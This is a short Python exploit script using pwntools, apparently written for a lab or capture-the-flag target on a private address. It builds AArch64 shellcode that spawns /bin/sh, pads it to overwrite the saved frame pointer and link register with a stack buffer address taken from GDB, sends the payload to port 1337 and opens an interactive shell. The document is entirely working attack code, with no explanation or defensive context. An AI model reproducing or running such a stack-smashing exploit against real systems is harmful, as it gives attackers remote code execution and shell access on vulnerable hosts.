from pwn import *

# Setup
context.arch = "aarch64"
context.endian = "little"

# Target IP and port
ip = "192.168.64.10"
port = 1337

# Known buffer address (from GDB)
buf_addr = 0xffffffffee28

# AArch64 shellcode to spawn /bin/sh
shellcode = asm(shellcraft.sh())

# Build final payload
payload  = shellcode.ljust(112, b"A")  # pad to saved FP
payload += b"B" * 8                    # overwrite saved x29 (FP)
payload += p64(buf_addr)              # overwrite saved x30 (LR)

print(f"[+] Payload length: {len(payload)}")
print(f"[+] Jumping to: {hex(buf_addr)}")

# Send payload over the network
with remote(ip, port) as conn:
    conn.sendline(payload)
    conn.interactive()
